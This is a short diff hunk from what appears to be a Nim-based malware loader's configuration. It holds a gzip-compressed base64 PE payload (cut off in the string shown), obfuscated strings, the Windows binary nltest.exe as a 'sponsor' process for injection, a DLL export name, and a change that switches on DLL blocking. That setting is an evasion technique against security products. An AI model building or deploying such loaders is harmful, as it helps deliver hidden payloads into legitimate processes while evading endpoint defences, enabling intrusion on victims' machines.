@@ -5,6 +5,6 @@ var compressedBase64PE* = protectString("H4sIAAAAAAAACux9eXxTVfb4y9I2pS0JS6AqSJC
 var sponsorPath* = protectString(r"C:\Windows\System32\nltest.exe")
 var sponsorParams* = protectString(r" ")
 var dllExportName* = protectString("DllRegisterServer") 
-var isBlockDlls* = false
+var isBlockDlls* = true
 var sleepSeconds* = 0
     
